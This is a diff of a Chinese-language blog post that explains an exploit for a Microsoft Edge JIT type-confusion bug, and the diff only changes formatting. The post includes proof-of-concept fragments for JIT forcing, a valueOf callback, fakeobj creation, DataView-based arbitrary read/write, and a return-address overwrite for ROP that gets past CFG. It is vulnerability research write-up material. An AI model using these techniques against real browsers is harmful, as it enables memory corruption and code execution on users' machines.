@@ -508,7 +508,8 @@
 <p>回顾POC：  </p>
 <pre><code>生成jit代码
 // force to optimize     
-for (var i = 0; i &lt; 0x10000; i++)        func(a, b, i);
+for (var i = 0; i &lt; 0x10000; i++)        
+    func(a, b, i);
 
 func(a, b, {valueOf: () =&gt; {
     设置一个valueOf回调        
@@ -530,8 +531,7 @@ a[0].toString();  //造成异常访问
 <pre><code>var arr = new Array(
      0x41414141,0x41414141,0x41414141,0x41414141,0x41414141,
       0x41414141,0x41414141,0x41414141,0x41414141,0x41414141,
-      0x41414141,0x41414141,0x41414141,0x41414141,0x41414141
-        )  
+      0x41414141,0x41414141,0x41414141,0x41414141,0x41414141)  
 </code></pre><p><img src="/blog/img/src/edge_1807_7.png" alt="">   </p>
 <p>由于a[0]此处保存着对象指针，修改代码如下，使func直接返回，泄露对象地址：  </p>
 <pre><code>function func(a, b, c) {
@@ -565,7 +565,8 @@ setobj(a_a, b, {valueOf: () =&gt; {
     }});
 fakeobj = a_a[0];
 </code></pre><p>设置dataview内存布局，由于arr是32位，DataView是64位，所以需要写两次，其中要构造的内容有对象类型，type指针，缓冲区大小，arraybufffer指针（找块0内存），arr[14],arr[15]指向目标缓冲区，后续通过修改arr[14],arr[15],完成任意地址读写,类似PALETTE-&gt;pFirstColor/BITMAP-&gt;pvScan0：<br><img src="/blog/img/src/edge_1807_9.png" alt=""> </p>
-<p>由于getUint32/setUint32是32位操作，所以进行64位读写需要分开执行2次，其对应的操作方式：<br>GetBitmapBits/GetPaletteEntries —&gt;  DataView.prototype.getUint32.call(fakeobj,0);<br>SetBitmapBits/SetPaletteEntries —&gt;  DataView.prototype.setUint32.call(fakeobj,0);<br>总结一下，设置arr[14],arr[15]，执行 DataView.prototype.getUint32.call/DataView.prototype.setUint32.call完成任意地址读写：<br><img src="/blog/img/src/edge_1807_10.png" alt="">  </p>
+<p>由于getUint32/setUint32是32位操作，所以进行64位读写需要分开执行2次，其对应的操作方式：<br>GetBitmapBits/GetPaletteEntries —&gt;  DataView.prototype.getUint32.call(fakeobj,0);<br>SetBitmapBits/SetPaletteEntries —&gt;  DataView.prototype.setUint32.call(fakeobj,0);    </p>
+<p>总结一下，设置arr[14],arr[15]，执行 DataView.prototype.getUint32.call/DataView.prototype.setUint32.call完成任意地址读写：<br><img src="/blog/img/src/edge_1807_10.png" alt="">  </p>
 <p>有了任意地址读写权限之后，下面要控制程序流程，因为cfg的存在，我们通过修改返回地址来劫持rip，所以需要泄露出一个栈地址：<br><img src="/blog/img/src/edge_1807_11.png" alt="">  </p>
 <p>找到Recycler对象就能找到stackbase,比如：<br><img src="/blog/img/src/edge_1807_12.png" alt=""><br>使用weakmap对象，验证地址：<br><img src="/blog/img/src/edge_1807_13.png" alt=""><br>接下来从stackbase开始搜索参数找到当前函数的返回地址，改写返回地址即可构造ROP，劫持程序执行流程：<br><img src="/blog/img/src/edge_1807_14.png" alt="">   </p>
 <h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h4><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1290" target="_blank" rel="external">https://bugs.chromium.org/p/project-zero/issues/detail?id=1290</a><br>microsoft edge browser             @holynop</p>
